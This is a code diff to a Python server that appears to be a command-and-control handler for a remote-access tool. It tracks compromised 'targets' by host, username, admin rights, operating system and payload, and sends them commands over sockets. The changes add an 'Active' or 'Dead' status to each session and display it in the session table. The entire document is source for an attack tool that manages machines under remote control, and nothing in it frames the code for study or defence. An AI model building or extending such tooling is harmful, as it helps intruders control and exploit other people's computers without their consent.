@@ -50,6 +50,7 @@ def target_comm(targ_id, targets, num):
         if message == 'exit':
             targ_id.send(message.encode())
             targ_id.close()
+            targets[num][7] = 'Dead'
             break
         if message == 'background' or message == 'bg':
             break
@@ -108,10 +109,10 @@ def comm_handler():
             time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
             host_name = socket.gethostbyaddr(remote_ip[0])
             if host_name is not None:
-                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, opsys, pay_val])
+                targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_val, opsys, pay_val, 'Active'])
                 print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Command > ', end="")
             else:
-                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, opsys, pay_val])
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_val, opsys, pay_val, 'Active'])
                 print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Command > ', end="")
         except:
             pass
@@ -234,7 +235,7 @@ if __name__ == '__main__':
                     myTable.field_names = ['Session', 'Status', 'Username', 'Admin', 'Target', 'Operating System', 'Session Start Time']
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, 'Placeholder', target[3], target[4], target[1], target[5], target[2]])
+                        myTable.add_row([session_counter, target[7], target[3], target[4], target[1], target[5], target[2]])
                         session_counter += 1
                     print (myTable)
                 if command.split(" ")[1] == '-i':
